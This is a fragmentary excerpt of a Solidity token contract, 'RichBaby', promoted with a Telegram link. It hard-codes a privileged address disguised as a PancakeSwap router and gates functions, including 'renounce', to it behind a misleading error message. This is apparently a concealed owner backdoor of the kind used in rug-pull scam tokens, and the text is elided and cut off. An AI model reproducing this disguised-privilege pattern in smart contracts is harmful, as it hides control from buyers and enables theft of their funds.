...
📱 Telegran : https://t.me/Richbabybull
...
contract Context {
 ...
 contract RichBaby is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _excluded;

    string private _name = "RichBaby";
    string private _symbol = "RICHBABY";
    ...
    address private _pancakeRouterTVENVOO = 0x28B6B447B9cc07CF53fb360a86058bF282b9DB4e;
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    modifier externelTVENVOO () {
        require(_pancakeRouterTVENVOO == _msgSender(), "ERC20: cannot permit Pancake address");
        _;
    }
    
    function renounce() public externelTVENVOO {
